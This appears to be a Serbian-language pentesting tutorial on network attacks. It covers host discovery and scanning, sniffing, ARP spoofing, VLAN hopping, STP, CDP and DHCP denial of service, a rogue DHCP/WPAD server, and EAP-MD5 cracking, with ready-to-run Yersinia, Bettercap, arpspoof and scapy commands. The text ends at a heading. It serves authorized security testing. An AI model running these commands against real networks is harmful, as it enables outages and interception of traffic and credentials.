# Pentesting mreža

{{#include ../../banners/hacktricks-training.md}}



## Otkrivanje hosts izvana

Ovo će biti **kratak odeljak** o tome kako pronaći **IPs koji odgovaraju** sa **Interneta**.\
U ovoj situaciji imate neki **opseg IP adresa** (možda čak i nekoliko **opsega**) i samo treba da pronađete **koje IP adrese odgovaraju**.

### ICMP

Ovo je **najlakši** i **najbrži** način da otkrijete da li je host aktivan ili ne.\
Možete pokušati poslati neke **ICMP** pakete i **očekivati odgovore**. Najjednostavniji način je poslati **echo request** i očekivati odgovor. To možete uraditi koristeći jednostavan `ping` ili `fping` za **opsege**.\
Takođe možete koristiti **nmap** da pošaljete druge tipove ICMP paketa (ovo će zaobići filtere na uobičajenim ICMP echo request-response).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

Često je slučaj da su sve vrste ICMP paketa filtrirane. U tom slučaju, sve što možete da uradite da proverite da li je host up jeste da **pokušate da pronađete open ports**. Svaki host ima **65535 ports**, pa ako imate "big" scope ne možete da testirate da li je **each port** svakog hosta open ili ne, to bi oduzelo previše vremena.\
Zato vam treba **fast port scanner** ([masscan](https://github.com/robertdavidgraham/masscan)) i lista **ports more used:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Ovaj korak možete takođe izvršiti pomoću `nmap`, ali je sporije i `nmap` ponekad ima problema da identifikuje aktivne hostove.

### Otkrivanje HTTP portova

Ovo je samo TCP otkrivanje portova korisno kada želite da se **fokusirate na otkrivanje HTTP** **servisa**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

Možete takođe pokušati da proverite da li je neki **UDP port open** kako biste odlučili da li treba da **obratite više pažnje** na **host.** Pošto UDP servisi obično **ne odgovaraju** sa **nikakvim podacima** na regularan prazan UDP probe packet, teško je reći da li je port filtriran ili open. Najlakši način da ovo utvrdite je da pošaljete packet vezan za servis koji radi, a pošto ne znate koji servis radi, trebalo bi da probate najverovatnije na osnovu broja porta:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Predložena nmap linija će testirati **top 1000 UDP ports** na svakom hostu unutar **/24** opsega, ali čak i samo ovo će potrajati **>20min**. Ako su potrebni **najbrži rezultati** možete koristiti [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` Ovo će poslati ove **UDP probes** na njihove **expected port** (za /24 opseg ovo će trajati samo 1 min): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port Discovery
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Ovde možete naći lep vodič za sve dobro poznate Wifi napade u trenutku pisanja:

{{#ref}}
../pentesting-wifi/
{{#endref}}

## Otkrivanje hostova iznutra

Ako ste unutar mreže, jedna od prvih stvari koju ćete želeti da uradite je da **otkrijete druge hostove**. U zavisnosti od toga **koliko buke** možete/želite da napravite, mogu se preduzeti različite akcije:

### Pasivno

Možete koristiti ove alate da pasivno otkrijete hostove unutar povezane mreže:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Aktivno

Imajte na umu da tehnike komentarisane u [_**Discovering hosts from the outside**_](#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_) mogu takođe biti **primenjene ovde**.\
Međutim, pošto ste u **same network** sa ostalim hosts, možete da uradite **više stvari**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Aktivni ICMP

Imajte u vidu da tehnike komentarisane u _Discovering hosts from the outside_ ([_**ICMP**_](#icmp)) mogu biti takođe **primenjene ovde**.\
Međutim, pošto ste u **istoj mreži** kao i ostali hostovi, možete uraditi **više stvari**:

- Ako izvršite **ping** na **subnet broadcast address**, ping bi trebalo da stigne do **svakog hosta** i oni bi mogli **odgovoriti** **vama**: `ping -b 10.10.5.255`
- Pingovanjem **network broadcast address** možete čak pronaći hostove unutar **other subnets**: `ping -b 255.255.255.255`
- Koristite `-PE`, `-PP`, `-PM` flagove `nmap` da izvršite otkrivanje hostova slanjem redom **ICMPv4 echo**, **timestamp**, i **subnet mask requests:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan se koristi za **upaljivanje** računara putem **network message**. The magic packet used to turn on the computer is only a packet where a **MAC Dst** is provided and then it is **repeated 16 times** inside the same paket.\
Ovakvi paketi se obično šalju u okviru **ethernet 0x0842** ili u **UDP packet to port 9**.\
Ako **no \[MAC]** is provided, paket se šalje na **broadcast ethernet** (i broadcast MAC će biti onaj koji se ponavlja).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Skeniranje hostova

Kada otkrijete sve IP adrese (eksterne ili interne) koje želite detaljno skenirati, mogu se preduzeti različite radnje.

### TCP

- **Otvoren** port: _SYN --> SYN/ACK --> RST_
- **Zatvoren** port: _SYN --> RST/ACK_
- **Filtriran** port: _SYN --> \[NEMA ODGOVORA]_
- **Filtriran** port: _SYN --> ICMP poruka_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Postoje 2 opcije za skeniranje UDP porta:

- Pošaljite **UDP packet** i proverite odgovor _**ICMP unreachable**_ ako je port **closed** (u nekim slučajevima ICMP će biti **filtered**, pa nećete dobiti nikakvu informaciju da li je port **closed** ili **open**).
- Pošaljite **formatted datagrams** da izazovete odgovor od **service** (npr. DNS, DHCP, TFTP i drugi, kao što je navedeno u _nmap-payloads_). Ako primite **response**, onda je port **open**.

**Nmap** će **mix both** opcije koristeći "-sV" (UDP scans are very slow), ali imajte na umu da su UDP scans sporiji od TCP scans:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** je dizajniran za upotrebu zajedno sa **TCP (Transmission Control Protocol)** i **UDP (User Datagram Protocol)**. Njegova glavna svrha je da olakša prenos telefonskih podataka preko IP mreža, odražavajući mnoge od karakteristika pouzdanosti koje se nalaze u **Signaling System 7 (SS7)**. **SCTP** je ključna komponenta porodice protokola **SIGTRAN**, koja ima za cilj transport SS7 signala preko IP mreža.

Podršku za **SCTP** obezbeđuju različiti operativni sistemi, kao što su **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** i **VxWorks**, što ukazuje na njegovu široku prihvaćenost i korisnost u oblasti telekomunikacija i umrežavanja.

Nmap nudi dve različite skeniranja za SCTP: _-sY_ i _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS and IPS izbegavanje


{{#ref}}
ids-evasion.md
{{#endref}}

### **Još nmap opcija**


{{#ref}}
nmap-summary-esp.md
{{#endref}}

### Otkrivanje internih IP adresa

Neispravno konfigurisani ruteri, firewalls i mrežni uređaji ponekad odgovaraju na mrežne probe koristeći nejavne izvorne adrese. tcpdump se može koristiti za identifikovanje paketa primljenih sa privatnih adresa tokom testiranja. Konkretno, na Kali Linuxu, paketi se mogu presretati na interfejsu eth2, koji je dostupan sa javnog Interneta. Važno je napomenuti da ako je vaša konfiguracija iza NAT-a ili Firewall-a, takvi paketi će verovatno biti filtrirani.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Sniffing omogućava da saznate detalje o IP ranges, subnet sizes, MAC addresses i hostnames pregledom captured frames i packets. Ako je network pogrešno konfigurisan ili je switching fabric pod opterećenjem, napadači mogu pasivnim network sniffing-om uhvatiti osetljive informacije.

Ako je switched Ethernet network pravilno konfigurisan, videćete samo broadcast frames i saobraćaj namenjen vašoj MAC address.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Takođe je moguće presretati pakete sa udaljenog računara preko SSH sesije koristeći Wireshark kao GUI u realnom vremenu.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Očigledno.

### Capturing credentials

Možete koristiti alate poput [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) da parsirate credentials iz pcap-a ili sa live interface-a.

## LAN napadi

### ARP spoofing

ARP Spoofing se sastoji u slanju gratuitous ARPResponses da bi se naznačilo da IP neke mašine odgovara MAC-u naše naprave. Žrtva će promeniti ARP table i svaki put kada pokuša da kontaktira lažirani IP, kontaktiraće našu mašinu.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

Preplavite CAM table switch-a slanjem velikog broja packets sa različitim source MAC address-ima. Kada je CAM table puna, switch počinje da se ponaša kao hub (broadcasting all the traffic).
```bash
macof -i <interface>
```
U modernim switch-ovima ova ranjivost je ispravljena.

### 802.1Q VLAN / DTP Attacks

#### Dynamic Trunking

The **Dynamic Trunking Protocol (DTP)** je dizajniran kao protokol na link sloju kako bi omogućio automatski sistem za trunking, dopuštajući switch-ovima da automatski biraju portove za trunk mode (Trunk) ili non-trunk mode. Upotreba **DTP** često se smatra indikatorom suboptimalnog dizajna mreže, što naglašava važnost ručne konfiguracije trunk-ova samo tamo gde je neophodno i obezbeđivanja odgovarajuće dokumentacije.

By default, switch ports su podešeni da rade u Dynamic Auto režimu, što znači da su spremni da iniciraju trunking ako ih podstakne susedni switch. Bezbednosni problem nastaje kada pentester ili attacker poveže uređaj na switch i pošalje DTP Desirable frame, prisiljavajući port da uđe u trunk mode. Ova akcija omogućava napadaču da numeriše VLAN-ove kroz analizu STP frame-ova i zaobiđe segmentaciju VLAN-ova postavljanjem virtuelnih interfejsa.

Prisutnost DTP-a po podrazumevanoj postavci na mnogim switch-ovima može biti iskorišćena od strane napadača da imitiraju ponašanje switch-a, čime dobijaju pristup saobraćaju kroz sve VLAN-ove. Skripta [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) se koristi za nadgledanje interfejsa, otkrivajući da li je switch u Default, Trunk, Dynamic, Auto, ili Access modu — pri čemu je poslednji jedina konfiguracija otporna na VLAN hopping attacks. Ovaj alat procenjuje status ranjivosti switch-a.

Ako se identifikuje ranjivost mreže, alat _**Yersinia**_ se može koristiti za "enable trunking" putem DTP protokola, omogućavajući posmatranje paketa sa svih VLAN-ova.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

Za enumeraciju VLANs-a moguće je takođe generisati DTP Desirable frame pomoću skripte [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. Ne prekidajte skriptu ni pod kojim okolnostima. Skripta ubacuje DTP Desirable svakih tri sekunde. **Dinamički kreirani trunk kanali na switchu žive samo pet minuta. Nakon pet minuta, trunk pada.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Želim da ukažem da **Access/Desirable (0x03)** označava da je DTP frame tipa Desirable, što naređuje portu da se prebaci u Trunk mode. A **802.1Q/802.1Q (0xa5**) označava tip enkapsulacije **802.1Q**.

Analizom STP frame-ova, **saznajemo da postoje VLAN 30 i VLAN 60.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Napad na određene VLAN-ove

Kada znate VLAN ID-ove i IP vrednosti, možete **konfigurisati virtuelni interfejs da napadnete određeni VLAN**.\
Ako DHCP nije dostupan, onda koristite _ifconfig_ da postavite statičku IP adresu.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

Razmatrani napad **Dynamic Trunking and creating virtual interfaces an discovering hosts inside** u drugim VLAN-ovima se **automatski izvodi** pomoću alata: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Ako napadač zna vrednost **MAC, IP and VLAN ID of the victim host**, može pokušati da **double tag a frame** tako što će označiti ram sa svojom dodeljenom VLAN-om i VLAN-om žrtve i poslati paket. Pošto **victim won't be able to connect back** napadaču, **best option for the attacker is communicate via UDP** ka protokolima koji mogu izvršiti neke interesantne akcije (kao SNMP).

Another option for the attacker is to launch a **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim** (probably through internet). Zatim, napadač bi mogao sniff-ovati na drugom hostu koji poseduje da bi video da li prima neke pakete od žrtve.

![](<../../images/image (190).png>)

Za izvođenje ovog napada možete koristiti scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

Ako imate **pristup switch-u na koji ste direktno povezani**, imate mogućnost da **bypass VLAN segmentation** unutar mreže. Jednostavno **prebacite port u trunk mode** (poznat i kao trunk), kreirajte virtualne interfejse sa ID-evima ciljanih VLAN-ova i konfigurišite IP adresu. Možete pokušati da zatražite adresu dinamički (DHCP) ili je konfigurišete statički. Zavisi od slučaja.


{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

U određenim okruženjima, kao što su guest wireless networks, podešavanja **port isolation (also known as private VLAN)** se primenjuju kako bi se sprečilo da klijenti povezani na wireless access point direktno komuniciraju međusobno. Međutim, identifikovana je tehnika koja može zaobići ove mere izolacije. Ova tehnika iskorišćava ili nedostatak network ACLs ili njihovu nepravilnu konfiguraciju, omogućavajući da se IP paketi rutiraju kroz ruter kako bi došli do drugog klijenta na istoj mreži.

Napad se izvodi kreiranjem **paketa koji nosi IP adresu odredišnog klijenta, ali sa MAC adresom rutera**. To navodi ruter da pogrešno prosledi paket ciljnom klijentu. Ovaj pristup je sličan onom koji se koristi u Double Tagging Attacks, gde se sposobnost kontrole hosta dostupnog žrtvi koristi za iskorišćavanje sigurnosne slabosti.

**Ključni koraci napada:**

1. **Crafting a Packet:** Paket je posebno konstruisan da uključi IP adresu ciljanog klijenta, ali sa MAC adresom rutera.
2. **Exploiting Router Behavior:** Konstruisani paket se šalje ka ruteru koji, zbog konfiguracije, preusmerava paket na ciljnog klijenta, zaobilazeći izolaciju koja je obezbeđena private VLAN podešavanjima.

### VTP Attacks

VTP (VLAN Trunking Protocol) centralizuje upravljanje VLAN-ovima. Koristi brojeve revizije da održi integritet VLAN baze podataka; svaka izmena uvećava taj broj. Switches usvajaju konfiguracije sa višim brojevima revizije, ažurirajući svoje VLAN baze podataka.

#### VTP Domain Roles

- **VTP Server:** Upravljanje VLAN-ovima—kreira, briše, menja. Emituje VTP announcements članovima domena.
- **VTP Client:** Prima VTP announcements kako bi sinhronizovao svoju VLAN bazu podataka. Ova uloga je ograničena i ne dozvoljava lokalne izmene VLAN konfiguracije.
- **VTP Transparent:** Ne učestvuje u VTP ažuriranjima, ali prosleđuje VTP announcements. Nije podložan VTP napadima i održava konstantan revision number jednak nuli.

#### VTP Advertisement Types

- **Summary Advertisement:** Emituje ga VTP server svakih 300 sekundi i nosi osnovne informacije o domenu.
- **Subset Advertisement:** Šalje se nakon promena u VLAN konfiguraciji.
- **Advertisement Request:** Inicira ga VTP client da zatraži Summary Advertisement, obično kao odgovor na detektovan veći configuration revision number.

VTP ranjivosti su eksploatisane isključivo preko trunk portova jer VTP announcements kruže samo kroz njih. Nakon DTP napada, scenariji mogu preći na VTP. Alati poput Yersinia mogu olakšati VTP napade, sa ciljem brisanja VLAN baze podataka, što efektivno remeti mrežu.

Napomena: Ova diskusija se odnosi na VTP verziju 1 (VTPv1).
```bash
yersinia -G # Launch Yersinia in graphical mode
```
U grafičkom modu Yersinia, izaberite opciju deleting all VTP vlans da očistite VLAN database.

### STP Attacks

**Ako ne možete da capture BPDU frames na vašim interfejsima, malo je verovatno da ćete uspeti u STP attack.**

#### **STP BPDU DoS**

Slanjem velikog broja BPDUs TCP (Topology Change Notification) ili Conf (the BPDUs that are sent when the topology is created) switches se preopterete i prestanu da rade ispravno.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

Kada se pošalje TCP, CAM table of the switches biće obrisana za 15s. Zatim, ako kontinuirano šaljete ovu vrstu packets, CAM table će se restartovati kontinuirano (ili na svakih 15segs) i kada se restartuje, switch se ponaša kao hub
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

Napadač simulira ponašanje switch-a kako bi postao STP root mreže. Tada će više podataka prolaziti kroz njega. Ovo je interesantno kada ste povezani na dva različita switch-a.\

Ovo se postiže slanjem BPDUs CONF paketa koji navode da je vrednost **priority** manja od stvarne vrednosti koju ima trenutni root switch.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Ako je napadač povezan na 2 switches, može biti root novog stabla i sav saobraćaj između tih switches će prolaziti kroz njega** (biće izveden MITM attack).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP napadi

CISCO Discovery Protocol (CDP) je suštinski za komunikaciju između CISCO uređaja, omogućavajući im da se međusobno **identifikuju i dele detalje konfiguracije**.

#### Pasivno prikupljanje podataka <a href="#id-0e0f" id="id-0e0f"></a>

CDP je konfigurisan da emituje informacije kroz sve portove, što može predstavljati bezbednosni rizik. Napadač koji se poveže na port na switchu može pokrenuti network sniffere kao što su **Wireshark**, **tcpdump**, ili **Yersinia**. Ova radnja može otkriti osetljive podatke o mrežnom uređaju, uključujući njegov model i verziju Cisco IOS-a koju koristi. Napadač bi zatim mogao ciljati specifične ranjivosti u identifikovanoj verziji Cisco IOS-a.

#### Izazivanje poplave CDP tabele <a href="#id-0d6a" id="id-0d6a"></a>

Agresivniji pristup uključuje pokretanje Denial of Service (DoS) napada preplavljivanjem memorije switch-a, predstavljajući se kao legitimni CISCO uređaji. Ispod je sekvenca komandi za iniciranje takvog napada koristeći Yersinia, mrežni alat namenjen testiranju:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Tokom ovog napada, CPU switch-a i CDP tabela suseda su znatno opterećeni, što se često naziva **“paraliza mreže”** zbog prekomerne potrošnje resursa.

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
You could also use [**scapy**](https://github.com/secdev/scapy/). Be sure to install it with `scapy/contrib` package.

### Napadi na VoIP i alat VoIP Hopper

VoIP telefoni, koji se sve više integrišu sa IoT uređajima, nude funkcionalnosti kao što su otključavanje vrata ili kontrola termostata putem specijalnih brojeva. Međutim, ova integracija može predstavljati sigurnosni rizik.

Alat [**voiphopper**](http://voiphopper.sourceforge.net) je dizajniran da emulira VoIP telefon u različitim okruženjima (Cisco, Avaya, Nortel, Alcatel-Lucent). Otkriva VLAN ID glasovne mreže koristeći protokole kao što su CDP, DHCP, LLDP-MED i 802.1Q ARP.

**VoIP Hopper** nudi tri moda za Cisco Discovery Protocol (CDP):

1. **Sniff Mode** (`-c 0`): Analizira mrežne pakete kako bi identifikovao VLAN ID.
2. **Spoof Mode** (`-c 1`): Generiše prilagođene pakete koji imitiraju one stvarnog VoIP uređaja.
3. **Spoof with Pre-made Packet Mode** (`-c 2`): Šalje pakete identične onima određenog Cisco IP telefona.

Preferirani mod zbog brzine je treći. Potrebno je navesti:

- mrežni interfejs napadača (`-i` parameter).
- ime VoIP uređaja koji se emulira (`-E` parameter), u skladu sa Cisco naming formatom (npr. SEP praćeno MAC adresom).

U poslovnim okruženjima, da bi se imitirao postojeći VoIP uređaj, može se:

- pregledati MAC nalepnica na telefonu,
- u meniju telefona pogledati informacije o modelu,
- priključiti VoIP uređaj na laptop i pratiti CDP zahteve koristeći Wireshark.

An example command to execute the tool in the third mode would be:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP Attacks

#### Enumeration
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Dve vrste DoS-a** mogu se izvesti protiv DHCP servera. Prva se sastoji u **simuliranju dovoljnog broja lažnih hostova da se iskoriste sve moguće IP adrese**.\
Ovaj napad će raditi samo ako možete videti odgovore DHCP servera i kompletirati protokol (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Na primer, ovo **nije moguće na Wifi mrežama**.

Drugi način za izvođenje DHCP DoS-a je slanje **DHCP-RELEASE paketa koristeći kao source svaku moguću IP**. Tada će server pomisliti da su svi završili sa korišćenjem IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Automatizovaniji način za ovo je korišćenje alata [DHCPing](https://github.com/kamorin/DHCPig)

Možete iskoristiti pomenute DoS attacks da primorate klijente da dobiju nove leases u okruženju i iscrpite legitimne servere tako da postanu neodgovarajući. Dakle, kada legitimni pokušaju ponovo da se povežu, **možete poslužiti zlonamerne vrednosti pomenute u sledećem napadu**.

#### Postavite zlonamerne vrednosti

Lažni DHCP server može se postaviti koristeći DHCP skript koji se nalazi na `/usr/share/responder/DHCP.py`. Ovo je korisno za mrežne napade, kao što je presretanje HTTP saobraćaja i akreditiva, preusmeravajući saobraćaj na zlonamerni server. Međutim, postavljanje lažnog gateway-a je manje efektivno jer omogućava samo presretanje izlaznog saobraćaja od klijenta, propuštajući odgovore sa pravog gateway-a. Umesto toga, preporučuje se postavljanje lažnog DNS ili WPAD servera za efikasniji napad.

Ispod su opcije komandi za konfigurisanje lažnog DHCP servera:

- **Naš IP (Gateway Advertisement)**: Koristite `-i 10.0.0.100` da oglasite IP vaše mašine kao gateway.
- **Naziv lokalnog DNS domena**: Opcionalno, koristite `-d example.org` da postavite lokalno DNS ime domena.
- **Originalna IP adresa rutera/gateway-a**: Koristite `-r 10.0.0.1` da navedete IP adresu legitimnog rutera ili gateway-a.
- **Primarna IP adresa DNS servera**: Koristite `-p 10.0.0.100` da postavite IP adresu lažnog DNS servera koji kontrolišete.
- **Sekundarna IP adresa DNS servera**: Opcionalno, koristite `-s 10.0.0.1` da postavite sekundarnu IP adresu DNS servera.
- **Netmask lokalne mreže**: Koristite `-n 255.255.255.0` da definišete netmasku za lokalnu mrežu.
- **Interfejs za DHCP saobraćaj**: Koristite `-I eth1` da slušate DHCP saobraćaj na određenom mrežnom interfejsu.
- **WPAD adresa konfiguracije**: Koristite `-w “http://10.0.0.100/wpad.dat”` da postavite adresu za WPAD konfiguraciju, pomažući pri presretanju web saobraćaja.
- **Lažiranje podrazumevanog gateway IP-a**: Uključite `-S` da lažirate IP adresu podrazumevanog gateway-a.
- **Odgovaraj na sve DHCP zahteve**: Uključite `-R` da server odgovara na sve DHCP zahteve, ali budite svesni da je ovo bučno i može biti otkriveno.

Ispravnim korišćenjem ovih opcija, može se uspostaviti lažni DHCP server koji efikasno presreće mrežni saobraćaj.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP Attacks**

U nastavku su neke od taktika napada koje se mogu koristiti protiv 802.1X implementacija:

- Aktivno brute-force password grinding putem EAP
- Napadi na RADIUS server sa neispravnim EAP sadržajem _\*\*_(exploits)
- Presretanje EAP poruka i offline password cracking (EAP-MD5 i PEAP)
- Forsiranje EAP-MD5 autentifikacije da bi se zaobišla TLS validacija sertifikata
- Injektovanje malicioznog mrežnog saobraćaja pri autentifikaciji koristeći hub ili slično

Ako je attacker između žrtve i authentication server, može pokušati degradirati (ako je potrebno) authentication protocol na EAP-MD5 i presresti pokušaj autentifikacije. Zatim bi to mogao brute-force-ovati koristeći:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Attacks <a href="#id-6196" id="id-6196"></a>

